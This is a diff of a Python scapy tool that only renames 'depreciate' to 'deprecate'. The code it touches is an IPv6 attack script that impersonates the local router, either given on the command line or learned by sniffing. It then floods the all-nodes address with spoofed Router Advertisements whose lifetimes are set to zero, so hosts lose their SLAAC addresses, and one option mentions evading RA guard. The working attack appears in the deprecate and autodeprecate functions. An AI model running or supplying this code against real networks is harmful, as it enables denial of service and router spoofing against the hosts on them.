@@ -4,7 +4,7 @@ import re
 import socket
 from scapy.all import *
 
-NAME="depreciate-ipv6-slaac.py"
+NAME="deprecate-ipv6-slaac.py"
 VERSION="0.1"
 
 # Very lazy, but it works
@@ -40,7 +40,7 @@ def outputErrors(errors,premsg=None):
 	print "Error(s): %s" % (premsg if premsg else '')
 	print '  ' + '\n  '.join(errors) + '\n'
 
-def depreciate(mac, linklocal, prefix, prefixlen, interval, iface):
+def deprecate(mac, linklocal, prefix, prefixlen, interval, iface):
 	sendp(Ether(src=mac)/IPv6(src=linklocal,dst="ff02::01")/ICMPv6ND_RA(prf=0,routerlifetime=0)/ICMPv6NDOptPrefixInfo(prefix=prefix,prefixlen=prefixlen,preferredlifetime=0,validlifetime=0)/ICMPv6NDOptSrcLLAddr(lladdr=mac),
 			loop=1, inter=interval, iface=iface)
 
@@ -51,7 +51,7 @@ def autodiscover_lfilter(pkt):
 
 	return True
 
-def autodepreciate(iface, interval):
+def autodeprecate(iface, interval):
 	pkt = sniff(filter="icmp6",iface=iface,count=1,lfilter=autodiscover_lfilter)
 
 	srcmac = pkt[0].src
@@ -67,7 +67,7 @@ def autodepreciate(iface, interval):
 		outputErrors(premsg="Failed to use auto", errors=errors)
 		return
 	
-	depreciate(srcmac, srcv6, prefix, prefixlen, interval, iface)
+	deprecate(srcmac, srcv6, prefix, prefixlen, interval, iface)
 
 def main():
 	# Force pcap to be used by scapy, otherwise we may not get all our packets
@@ -75,7 +75,7 @@ def main():
 
 	parser = optparse.OptionParser(usage="Usage: %prog [options]", version=NAME + " " + VERSION)
 
-	parser.add_option('-a', '--auto', action="store_true", dest="auto", default=False, help="Automatically find a v6 router, and use it's details to depreciate the network addresses. All options, except interface and interval, are ignored if this is invoked.")
+	parser.add_option('-a', '--auto', action="store_true", dest="auto", default=False, help="Automatically find a v6 router, and use it's details to deprecate the network addresses. All options, except interface and interval, are ignored if this is invoked.")
 	parser.add_option('-f', '--fragment', action='store_true', dest='fragment', default=False, help="Fragment the packet to avoid RA guard. Currently not implemented.")
 	parser.add_option('-i', '--interface', action='store', dest='iface', default='eth0', help='Interface to receive/send packets. Defaults to use eth0.')
 	parser.add_option('-m', '--source-mac', action='store', dest='srcmac', help='Source MAC address for RA packet. If not using auto this is required.')
@@ -87,7 +87,7 @@ def main():
 	(options, args) = parser.parse_args()
 
 	if (options.auto):
-		autodepreciate(iface=options.iface, interval=options.interval)
+		autodeprecate(iface=options.iface, interval=options.interval)
 		return
 
 	errors = checkOptions(options.srcmac, options.srcv6, options.prefix, options.prefixlen, options.interval)
@@ -96,7 +96,7 @@ def main():
 		outputErrors(errors)
 		return
 
-	depreciate(options.srcmac, options.srcv6, options.prefix, options.prefixlen, options.interval, options.iface)
+	deprecate(options.srcmac, options.srcv6, options.prefix, options.prefixlen, options.interval, options.iface)
 
 if __name__ == '__main__':
 	main()
